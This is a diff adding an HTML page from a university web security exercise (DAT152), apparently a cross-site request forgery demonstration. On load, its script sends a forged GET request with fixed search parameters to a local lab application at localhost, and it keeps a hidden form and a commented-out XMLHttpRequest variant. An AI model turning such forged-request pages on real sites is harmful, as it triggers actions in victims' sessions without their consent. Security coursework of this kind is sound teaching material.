@@ -1,0 +1,41 @@
+<!DOCTYPE html>
+<html>
+<head>
+<meta http-equiv="Content-Type" content="text/html; charset=UTF-8" />
+<title>DAT152 - Web Security exercise</title>
+</head>
+<body>
+
+<form name="form1" action="dosearch" method="get">
+		<input type="hidden" name="user" value="q" /> 
+		<input type="hidden" name="searchkey" value="CSRF" />
+</form>
+<script> 
+// document.form1.submit()
+
+var form = new FormData();
+form.append("searchkey","CSRF");
+form.append("user","q");
+
+let req = new Request("http://localhost:8080/Obl2TheApplication/dosearch?searchkey=CSRF&user=q", {
+	method: "GET",
+	mode: "cors",
+	cache: "default",
+	headers: new Headers()
+});
+
+fetch(req).then((noe)=>{console.log(noe)} , (err)=>{throw(err)}) ;
+
+ 
+// try {
+//     const xmlhttprequest = new XMLHttpRequest()
+//     xmlhttprequest.open('GET', "http://localhost:8080/Obl2TheApplication/dosearch?searchkey=CSRF&user=q", true)
+//     xmlhttprequest.send(null)
+//   	} catch (e) {		
+// 	}
+
+    
+</script>
+
+</body>
+</html>
